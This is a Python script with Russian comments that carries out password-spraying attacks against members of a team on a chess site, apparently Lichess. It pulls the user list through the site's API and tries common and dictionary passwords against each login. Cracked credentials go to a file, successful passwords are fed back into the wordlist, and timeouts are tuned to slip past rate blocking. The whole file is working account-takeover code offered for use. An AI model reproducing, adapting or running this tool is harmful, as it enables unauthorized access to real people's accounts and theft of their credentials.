# Для работы программы, необходимо установить модуль requests. Если у вас получилась ошибка, то у вас нету этого модуля.
import os
import sys

import ndjson
import requests

import logging
from rich.logging import RichHandler

from config import *


# По желанию, чтобы можно было взламывать по дате или году рождения, указанном в профиле, можно загрузить у фиша еще одну программу под именем tracker.py
# Функции в модуле: tracker.get_birthday(username) возвращает дату рождения, если написана в профиле, tracker.get_year(username) - год рождения

FORMAT = "%(message)s"
logging.basicConfig(
    level=logging.INFO, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
) # настройки для логгинга

log = logging.getLogger("rich") # инциализация лога

# Заходим через прокси
def start(passwords):
    # Это функция получения цифр с логина
    def getNumericPart(string):
        res = ''
        for i in string:
            if (i.isnumeric()): res = res + i
        return res

    def getNamePart(s):
        res = s[0]
        a = 'qwertyuiopasdfghjklzxcvbnm'
        for i in range(1, len(s)):
            if (a.find(s[i]) == -1): return res
            res = res + s[i]
        return res

    # Функция превращения даты (рождения) из формата ДД-ММ-ГГГГ в формат ДД-ММ-ГГ
    def trans(s):
        return s[0] + s[1] + s[2] + s[3] + s[6] + s[7]

    # Здесь написать ID команды, прога будет взламывать всех участников команды
    team = input(magenta + "[?] Введите ID команды: " + white)

    # Получаем список людей для взлома
    # Это может занять некоторое время
    print(yellow + "[..] Получаем список, это может занять некоторое время...")
    r_m = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
    users = r_m.json(cls=ndjson.Decoder)

    # Выводим сообщение, что список готов
    print(green + f"[+] Список пользователей получен!")
    print(
        cyan + f"[TIP] Запрос {str(OK_RESPONSE)} означает, что акк взломан. {str(ERROR_RESPONSE)} - не получилось. {str(BLOCKED_RESPONSE)} - личесс заблокировал запрос(рекомендуется выключить программу)") # выводим подсказку
    # users = open("mk").read().split("\n")
    print(
        green + f"Взломанные аккаунты будут сохранены в файл {HACKEDREAL_PATH}/{team}.txt")  # вывод о том куда будут сохранятся взломанные акки
    k = 1
    # Начинаем перебор
    for user in users:

        #   Получаем ник участника
        username = user[f"{JSON_USERNAME}"]

        if (len(username) < 4): continue
        if (not k): continue
        #   Здесь писать список паролей, которые будут перебиратся
        #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
        #   Писать сразу больше двух паролей не рекомендуется
        for password in passwords:
            r = requests.post(f"https://{SERVER}/{LOGIN}",
                              data={"username": username, "password": password.strip(), "remember": f"{str(REMEMBER)}"},
                              headers={"X-Requested-With": X_REQUESTED_WITH,
                                       "User-Agent": USER_AGENT}) # пытаемся войти в акк
            #

            #       Выводим статус взлома
            #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
            if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
                log.info(f"Пароль получен! ({r}) {username}: {password}")
                with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")

                with open(f"{PASSWORDS_POPULAR_PATH}", "a", encoding="utf-8") as mb_list: # сохраняем взломанный пароль в пароли типа МБ
                    mb_list.write(f"{password} \n")

            elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
                log.info(f"{r}, {username}: {password}")

                if SAVE_EVERYTHING_MULTIPART:
                    with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                        h_list.write(f"{get_ts()} {r} {username}: {password} \n")

            elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
                log.error(f"{r}, {username}: {password}")

                if SAVE_EVERYTHING_MULTIPART:
                    with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                        h_list.write(f"{get_ts()} {r} {username}: {password} \n")
            k += 1

            time.sleep(5)
            if k % 10 == 0:
                time.sleep(HACKMULTIPART_TIMEOUT)  # ждем потому что таймаут после каждого 10 подбора


if __name__ == "__main__":
    with open(f"{PASSWORDS_DICT_PATH}", "r", encoding="utf-8") as passwords:
        start(passwords.readlines())
    print(green + "[+] Готово.")
    input(magenta + "[?] Продолжить? " + white)
    os.system('cls')
    sys.exit()
